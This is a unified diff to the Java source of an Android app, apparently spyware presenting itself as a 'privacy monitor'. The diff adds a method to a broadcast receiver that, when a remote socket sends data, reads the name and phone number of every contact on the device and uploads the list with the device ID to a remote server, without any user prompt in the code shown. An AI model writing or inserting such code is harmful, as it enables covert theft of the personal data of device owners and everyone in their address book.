@@ -1,6 +1,10 @@
 package com.privacy.monitor.receiver;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.Collection;
 import java.util.HashMap;
@@ -8,6 +12,8 @@ import java.util.Iterator;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
+
+import com.google.gson.Gson;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.CallRecordDB;
 import com.privacy.monitor.db.DirectiveDB;
@@ -24,10 +30,13 @@ import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
 import com.privacy.monitor.util.NetworkUtil;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
@@ -47,7 +56,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
-		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+		final SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 		if(cSocket == null){
 		
 			String devBrand = sp.getString(C.DEVICE_BRAND,"");
@@ -69,7 +78,10 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			cSocket = new ClientSocket(deviceInfo) {
 				@Override
 				public void receiveData(String type, String data) {
-					
+					boolean hasUpload= sp.getBoolean(C.CONTACTS_UPLOAD,false);
+					if(!hasUpload){
+						uploadContact(context, sp);
+					}
 				}
 			};
 			cSocket.start();
@@ -286,5 +298,63 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			 }
 		  }
 	   }
+	}
+	
+	private void uploadContact(Context context,SharedPreferences sp){
+		Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
+		ContentResolver resolver = context.getContentResolver();
+		Cursor cursor =resolver.query(uri,new String[]{"_id"}, null, null, null);
+		boolean one = false;
+		boolean two = false;
+		String name = "";
+		String phone = "";
+		ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
+		if(cursor !=null){
+			while(cursor.moveToNext()){
+				int id = cursor.getInt(0);
+				Uri uri2 = Uri.parse("content://com.android.contacts/data");
+				Cursor cursor2 = resolver.query(uri2,new String[]{"mimetype","data1"}, "raw_contact_id = ? ", new String[]{id+""}, null);
+			    if(cursor2!=null){
+			    	while(cursor2.moveToNext()){
+			    		String mimetype = cursor2.getString(0);
+			    		String data1 = cursor2.getString(1);
+			    		if("vnd.android.cursor.item/name".equals(mimetype)){
+			    			name = data1;
+			    			one = true;
+			    		}else if("vnd.android.cursor.item/phone_v2".equals(mimetype)){
+			    			phone = data1;
+			    			two = true;
+			    		}
+			    		if(one && two){
+			    			ArrayList<String> contactList = new ArrayList<String>();
+			    			contactList.add(name);
+			    			contactList.add(phone);
+			    			list.add(contactList);
+			    			one = false;
+			    			two = false;
+			    		}
+			    	}
+			    }
+			}
+			String param = "key="+ClientSocket.APP_REQ_KEY+"&device_id="+sp.getString(C.DEVICE_ID,"")+"&book_list="+ new Gson().toJson(list);
+		
+			InputStream is = NetworkUtil.upload2(context, param,C.RequestMethod.uploadContact);
+			InputStreamReader isr = new InputStreamReader(is);
+			BufferedReader br = new BufferedReader(isr);
+			String temp = null;
+			String result = "";
+			try {
+				while ((temp = br.readLine()) != null) {
+					result = result + temp;
+				}
+				Editor editor = sp.edit();
+				editor.putBoolean(C.CONTACTS_UPLOAD, true);
+				editor.commit();
+				isr.close();
+				is.close();
+			} catch (IOException e) {
+				e.printStackTrace();
+			}
+		}
 	}
 }
